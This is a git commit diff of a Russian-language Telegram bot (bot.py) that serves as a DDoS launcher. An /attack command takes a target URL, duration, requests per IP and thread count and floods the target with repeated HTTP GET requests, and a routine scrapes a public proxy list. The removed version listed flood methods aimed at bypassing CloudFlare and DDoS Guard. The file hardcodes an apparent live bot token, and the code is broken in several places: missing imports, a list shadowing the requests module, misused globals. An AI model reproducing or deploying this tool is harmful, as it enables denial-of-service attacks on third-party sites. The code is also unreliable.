b0437738ba39dc4ce56394d6fe87c3fb1101b45f
fyuman666 <139720469+fyuman666@users.noreply.github.com>
2023-08-23 11:43:57 +0200

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,84 +1,104 @@
-import telebot
-from telebot import types
+from telegram import Bot
+import requests
+import os
 
-bot_token = '6696438979:AAFQ22gFgWMT-eoVda-a_EZBfE_zkOBCMB0'
+bot_token = '6696438979:AAFQ22gFgWMT-eoVda-a_EZBfE_zkOBCMB0' # Replace with your bot token
+bot = Bot(token=bot_token)
 
-access_key = 'beta'
+attack_interval = None
+is_attack_started = False
+proxies = []
 
-bot = telebot.TeleBot(bot_token)
+def start_command(update, context):
+    chat_id = update.message.chat_id
+    message = '''
+    bot by HighNet @fyuman_net
 
-registered_users = []
-user_message_counts = {}
+    Введите /stop, чтобы остановить атаку.
+    
+    Чтобы начать атаку, используйте следующую команду:
+    /attack <url> <time> <req_per_ip> <threads>
 
-@bot.message_handler(commands=['start'])
-def start(message):
-    
-    if message.from_user.id in registered_users:
-        bot.send_message(chat_id=message.chat.id, text="Вы зарегистрированы.")
-    else:
-  
-        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True)
-        markup.add(types.KeyboardButton(text="Отправить номер телефона", request_contact=True))
-        bot.send_message(chat_id=message.chat.id, text="Для регистрации, пожалуйста, поделитесь своим номером телефона.", reply_markup=markup)
+    Пример:
+    /attack http://example.com 135 65 5
+    '''
+    context.bot.send_message(chat_id=chat_id, text=message)
 
-@bot.message_handler(content_types=['contact'])
-def register(message):
- 
-    user_id = message.from_user.id
-    user_first_name = message.from_user.first_name
-    
-    
-    registered_users.append(user_id)
-    
+def attack_command(update, context):
+    chat_id = update.message.chat_id
+    command_params = context.args
 
-    markup = types.ReplyKeyboardMarkup(row_width=2)
-    attack_btn = types.KeyboardButton(text="Method Attack")
-    start_btn = types.KeyboardButton(text="Start Attack")
-    markup.add(attack_btn, start_btn)
-    
-    
-    bot.send_message(chat_id=message.chat.id, text=f"Регистрация завершена, {user_first_name}!", reply_markup=markup)
+    if len(command_params) != 4:
+        message = 'Неверная команда! Пожалуйста, укажите требуемые параметры: URL, время, req_per_ip и threads.'
+        context.bot.send_message(chat_id=chat_id, text=message)
+        return
 
-@bot.message_handler(func=lambda message: True)
-def handle_message(message):
+    if is_attack_started:
+        message = 'Атака запущена!'
+        context.bot.send_message(chat_id=chat_id, text=message)
+        return
 
-    sender_id = message.from_user.id
-    
-    
-    text = message.text
-    
- 
-    if text == access_key:
-    
-        bot.send_message(chat_id=sender_id, text="proxy not found error")
-    elif text == "Method Attack":
-    
-        markup = types.ReplyKeyboardMarkup(row_width=2)
-        cloudflare_btn = types.KeyboardButton(text="CloudFlare")
-        ddosguard_btn = types.KeyboardButton(text="DDoS Guard")
-        httpflood_btn = types.KeyboardButton(text="HTTP FLOOD")
-        getflood_btn = types.KeyboardButton(text="GET REQUEST FLOOD")
-        postflood_btn = types.KeyboardButton(text="POST FLOOD")
-        markup.add(cloudflare_btn, ddosguard_btn, httpflood_btn, getflood_btn, postflood_btn)
-        
-      
-        bot.send_message(chat_id=sender_id, text="Выберите метод атаки:", reply_markup=markup)
-    elif text == "Start Attack":
-        
-        bot.send_message(chat_id=sender_id, text="URL | PORT | TIME | METHOD")
-    else:
-    
-        if sender_id in user_message_counts:
-            user_message_counts[sender_id] += 1
-        else:
-            user_message_counts[sender_id] = 1
-        
-    
-        if user_message_counts[sender_id] > 500:
-            
-            bot.send_message(chat_id=message.chat.id, text="Вы превысили лимит сообщений. Ваш аккаунт заблокирован.")
-            bot.kick_chat_member(chat_id=message.chat.id, user_id=sender_id)
-        else:
-            bot.send_message(chat_id=sender_id, text="Доступ запрещен.")
+    target = command_params[0]
+    time = int(command_params[1])
+    req_per_ip = int(command_params[2])
+    threads = int(command_params[3])
 
-bot.polling()
+    global attack_interval
+    attack_interval = context.job_queue.run_repeating(send_req, interval=1, first=0, context=(target, time, req_per_ip, threads))
+    is_attack_started = True
+
+    success_message = f'Атака успешно запущена на {target} в течение {time} секунд с {threads} потоками и {req_per_ip} запросов на IP.'
+    context.bot.send_message(chat_id=chat_id, text=success_message)
+
+    context.job_queue.run_once(stop_attack, time, context=chat_id)
+
+def stop_command(update, context):
+    chat_id = update.message.chat_id
+    context.job_queue.stop()
+    is_attack_started = False
+    message = 'Атака остановлена.'
+    context.bot.send_message(chat_id=chat_id, text=message)
+
+def send_req(context):
+    target, time, req_per_ip, threads = context.job.context
+    requests = []
+    for i in range(threads):
+        for j in range(req_per_ip):
+            requests.append(requests.get(target))
+
+    try:
+        for request in requests:
+            response = request.result()
+            print(response)
+    except Exception as e:
+        print(str(e))
+
+def scrape_proxies():
+    try:
+        response = requests.get('https://www.proxy-list.download/api/v1/get?type=https')
+        proxies = response.text.split('\r\n')
+        with open('proxies.txt', 'w') as file:
+            file.write('\n'.join(proxies))
+        print('Proxies have been scraped and saved to proxies.txt')
+    except Exception as e:
+        print('Error scraping proxies:', str(e))
+
+scrape_proxies()
+
+def main():
+    updater = Updater(token=bot_token, use_context=True)
+    dispatcher = updater.dispatcher
+
+    start_handler = CommandHandler('start', start_command)
+    attack_handler = CommandHandler('attack', attack_command)
+    stop_handler = CommandHandler('stop', stop_command)
+
+    dispatcher.add_handler(start_handler)
+    dispatcher.add_handler(attack_handler)
+    dispatcher.add_handler(stop_handler)
+
+    updater.start_polling()
+    updater.idle()
+
+if __name__ == '__main__':
+    main()
